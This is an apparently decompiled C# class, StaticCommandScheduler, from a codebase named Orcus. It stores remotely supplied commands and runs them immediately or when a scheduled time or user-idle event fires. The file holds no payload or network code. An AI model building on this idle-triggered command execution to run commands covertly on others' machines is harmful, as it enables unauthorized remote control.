using System;
using System.Collections.Generic;
using System.Linq;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.ExecutionEvents;
using Orcus.StaticCommandManagement.ExecutionEvents;

namespace Orcus.StaticCommandManagement;

public class StaticCommandScheduler
{
	public delegate void ExecutePotentialCommandDelegate(PotentialCommand potentialCommand);

	private readonly Dictionary<uint, Type> _executionEvents;

	private DynamicCommandStore _dynamicCommandStore;

	private ExecutePotentialCommandDelegate _executePotentialCommandDelegate;

	public StaticCommandScheduler()
	{
		_executionEvents = new Dictionary<uint, Type>(((IEnumerable<IExecutionEvent>)(object)new IExecutionEvent[2]
		{
			new DateTimeExecutionEvent(),
			new IdleExecutionEvent()
		}).ToDictionary((IExecutionEvent x) => x.get_Id(), (IExecutionEvent y) => ((object)y).GetType()));
	}

	public void Initialize(ExecutePotentialCommandDelegate executePotentialCommandDelegate, DynamicCommandStore dynamicCommandStore)
	{
		_executePotentialCommandDelegate = executePotentialCommandDelegate;
		_dynamicCommandStore = dynamicCommandStore;
		lock (dynamicCommandStore.ListLock)
		{
			foreach (PotentialCommand storedCommand in dynamicCommandStore.StoredCommands)
			{
				InitializePotentialCommand(storedCommand, isStored: true);
			}
		}
	}

	public void AddPotentialCommand(PotentialCommand potentialCommand)
	{
		InitializePotentialCommand(potentialCommand, isStored: false);
	}

	private void InitializePotentialCommand(PotentialCommand potentialCommand, bool isStored)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (_executionEvents.TryGetValue(potentialCommand.get_ExecutionEvent().get_Id(), out var value))
		{
			IExecutionEvent val = (IExecutionEvent)Activator.CreateInstance(value);
			val.Initialize(potentialCommand.get_ExecutionEvent().get_Parameter());
			if (!val.get_CanExecute())
			{
				if (!isStored)
				{
					_dynamicCommandStore.AddStoredCommand(potentialCommand);
				}
				val.add_TheTimeHasCome((EventHandler)delegate
				{
					_executePotentialCommandDelegate(potentialCommand);
					_dynamicCommandStore.RemoveStoredCommand(potentialCommand);
				});
				return;
			}
		}
		_dynamicCommandStore.RemoveStoredCommand(potentialCommand);
		_executePotentialCommandDelegate(potentialCommand);
	}
}
